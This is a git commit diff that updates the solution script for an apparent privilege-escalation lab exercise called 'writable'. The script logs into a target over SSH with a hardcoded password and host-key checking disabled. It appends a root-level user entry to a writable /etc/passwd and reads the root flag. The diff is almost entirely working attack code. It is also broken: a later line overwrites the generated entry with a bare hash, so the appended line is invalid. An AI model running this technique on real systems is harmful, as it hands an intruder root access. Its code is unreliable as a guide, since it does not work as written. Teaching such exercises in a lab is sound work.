d8ed6f4914a6f9c2521cd7b47d8e09856cb2deae
Catalin Iovita <cataliniovita@yahoo.com>
2022-07-26 03:39:14 +0300

    Update final solution for writable

--- privilege-escalation/activities/writable/sol/solution.sh
+++ privilege-escalation/activities/writable/sol/solution.sh
@@ -1,12 +1,16 @@
 #!/bin/bash
 
-generated_passwd=$(python2 -c 'import crypt; print crypt.crypt("sparrow", "$6$salt")')
+# Generate any tipe of password hash
+generated_passwd=$(mkpasswd -m SHA-512 sparrow)
 passwd="sparrow:$generated_passwd:0:0:Sparrow:/root:/bin/bash"
+
+# Hash example
+passwd="\$6\$d3PyMB0M\$KMrLIrQ8lMnmxZRd2qEVdStQUjvDRFiKYvlH1.jhdqIJe.a2caa6zymb5RjbS0cvs0J0eOyJ1ZK4rBQfdbMqk0"
+echo "Generated password: $passwd"
 
 if [ -z "$1" ]
 then
     echo "No IP supplied. Please provide the target IP address!"
 else
-    ip=$1
-    sshpass -pYvFWPeC7sTWJdaYQ ssh -o StrictHostKeyChecking=no jack@$1 -p 2022 "echo $passwd >> /etc/passwd && echo \"sparrow\" | su -c \"cat /root/flag.txt\" sparrow"
+    sshpass -pYvFWPeC7sTWJdaYQ ssh -o StrictHostKeyChecking=no jack@$1 -p 2022 "echo $passwd >> /etc/passwd && echo "sparrow" | su -c \"cat /root/flag.txt\" sparrow"
 fi
